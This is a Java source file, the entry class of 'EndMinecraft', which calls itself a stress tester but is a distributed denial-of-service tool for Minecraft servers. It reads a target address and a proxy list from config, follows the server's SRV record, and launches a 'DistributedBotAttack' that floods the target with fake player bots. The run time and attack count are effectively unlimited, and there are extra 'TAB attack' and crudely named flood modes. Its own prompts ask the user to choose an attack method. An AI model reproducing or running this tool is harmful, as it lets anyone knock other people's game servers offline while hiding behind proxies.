package me.alikomi.endminecraft;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Hashtable;
import java.util.Properties;
import java.util.Scanner;

import xyz.yuanpi.PropsUtil;
import xyz.yuanpi.config;
import javax.naming.NamingException;
import javax.naming.directory.Attribute;
import javax.naming.directory.InitialDirContext;

import luohuayu.EndMinecraftPlus.ASMInject;
import luohuayu.EndMinecraftPlus.Utils;
import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
import luohuayu.EndMinecraftPlus.tasks.attack.DistributedBotAttack;
import luohuayu.MCForgeProtocol.MCForgeInject;
import java.util.HashMap;
import luohuayu.EndMinecraftPlus.tasks.attack.IAttack;

public class Main extends Utils {
	private static String ip;
	public static int port = 25565;
	static String mode;

	public static Scanner scanner = new Scanner(System.in);

	public static void main(String[] args) throws InterruptedException, IOException, IllegalAccessException,
			InstantiationException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException,
			ClassNotFoundException, NamingException {
		ASMInject.inject();
		MCForgeInject.inject();
		getInfo();
		showMenu();
	}

	private static void getInfo() throws NamingException {
		config.readconfig("config.properties");

		ip = config.getValue("ip");
		port = config.toint(config.getValue("port"));
		mode = config.getValue("mode");

		log("欢迎使用EndMinecraft压测程序", "", "=======================");
		Hashtable<String, String> hashtable = new Hashtable<String, String>();
		hashtable.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
		hashtable.put("java.naming.provider.url", "dns:");
		try {
			Attribute qwqre = (new InitialDirContext(hashtable))
					.getAttributes((new StringBuilder()).append("_Minecraft._tcp.").append(ip).toString(),
							new String[] { "SRV" })
					.get("srv");
			if (qwqre != null) {
				String[] re = qwqre.get().toString().split(" ", 4);
				log("检测到SRV记录，自动跳转到SRV记录");
				ip = re[3];
				log("ip: " + ip);
				port = Integer.parseInt(re[2]);
				log("port: " + port);
			}
		} catch (Exception e) {
		}
	}

	private static void showMenu() throws IOException, InterruptedException {
		while (true) {
			log("请输入攻击方式：", "2 : 分布式假人攻击(集群压测)");
			log("========================");
			switch (mode) {
				case "2":
					_2();
					return;
				default:
					log("您的选择有误，请重新选择");
			}
		}
	}

	public static void _2() {
		int time = 999999999;
		int maxAttack = 999999999;
		log("请输入每次加入服务器间隔(ms)");
		int sleepTime = config.toint(config.getValue("delay"));
		log("请输入是否开启TAB攻击 y/n，默认关闭(n)");
		boolean tab = config.getBoolean("tab");
		log("请输入是否开启操死乐乐模式 y/n，默认关闭(n)");
		boolean lele = config.getBoolean("lele");
		getProxy();
		IAttack attack = new DistributedBotAttack(time, maxAttack, sleepTime, lele, tab, new HashMap<String, String>());
		attack.start(ip, port);
	}

	public static void getProxy() {
		log("请输入代理文件名 如http.txt");
		String filename = config.getValue("proxies");
		log("正在获取代理");
		ProxyPool.getProxysFromFile(filename);
	}

}